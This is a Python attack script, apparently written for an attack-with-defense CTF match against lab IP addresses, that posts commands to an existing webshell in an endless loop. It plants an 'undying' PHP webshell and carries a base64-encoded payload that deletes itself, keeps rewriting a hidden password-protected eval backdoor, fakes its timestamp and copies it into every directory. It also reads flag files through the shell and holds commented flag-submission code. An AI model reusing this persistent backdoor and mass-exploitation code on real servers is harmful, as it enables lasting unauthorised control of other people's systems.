# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : Link_the_Trojan.py
# 时间    : 2022/10/6 15:39
# -----------------------------------------------------------------------------------
import requests
import re

busi = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iY2YzNmE4M2JlN2M0MDM3NmFkYWQ5ZDBhYmIzNmFjYzAiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAuY29uZjFnLnBocCcpOwogICAgc3lzdGVtKCJlY2hvICdkSEpoZG1WeVpHbHlLQ2tvY0hWemFHUWdJaVF4SWlBK0lDOWtaWFl2Ym5Wc2JDQXlQaVl4TzJadmNpQm1hV3hsSUdsdUlHQnNjeUF0TVdBN1pHOGdhV1lnZEdWemRDQXRaQ0FpSkdacGJHVWlPM1JvWlc0Z1kzQWdKRkJYUkM4dVkyOXVaakZuTG5Cb2NDQWtVRmRFTHlSbWFXeGxPMlZqYUc4Z0lpUlFWMFF2SkdacGJHVWlPM1J5WVhabGNtUnBjaUFpSkdacGJHVWlJQ0lrS0NoMFlXSWdLeUF4SUNBcEtTSTdabWs3Wkc5dVpTazdkSEpoZG1WeVpHbHknIHwgYmFzZTY0IC1kID4gMS5zaCIpOwogICAgJGFzZCA9IHN5c3RlbSgiYmFzaCAxLnNoIik7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > /www/wwwroot/192.168.56.134/conf1g.php");'''
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

passwd = "aaa"
payload = {
    passwd: 'print_r(readfile(\'../../../../flag\'));'
    # passwd: busi
}

# 写入不死马
file = open("busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
data = {passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"}  # 写入不死马
# 读取IP
# file = open('ip_result_of_scanning.txt', "r")
# ip_list = file.read().splitlines()
# file.close()

ip_list = ["http://192.168.56.135/awd/upload/0/file/202210/123.php"]
list = []


def shell():
    for i in ip_list:
        try:
            # url = i + "awd/index.php?a=system(\'readfile()\');"http://192.168.56.135/awd/upload/0/file/202210/123.php
            # url = i+"awd/index.php?shell=system(ls)"
            # print(url)
            response = requests.post(i, data=data, headers=headers, timeout=1)
            # print(response.text)
            # code = response.status_code
            # # print(i+"e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))")
            # # list.append(io.text[0:38])
            # print(code)
            #list.append(re.search("flag{.*}", response.text).group(0)[:38])
            print(list)
        except requests.exceptions.RequestException as e:
            pass


# def shell1():
#     for i in ip_list:
#         try:
#             url = i+"e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))"
#             response = requests.get(url, headers=headers, timeout=1)
#             list.append(re.search("flag{.*}", response.text).group(0)[:38])
#         except requests.exceptions.RequestException as e:
#             pass
#     print(list)

while True:
    shell()
    # shell1()

    # for i in list:
    #     io = requests.get("https://ctf.bugku.com/awd/submit.html?token=c2c1e4d002daa9eea931888935b0dd86&flag=" + str(i))  # token 根据场景更改
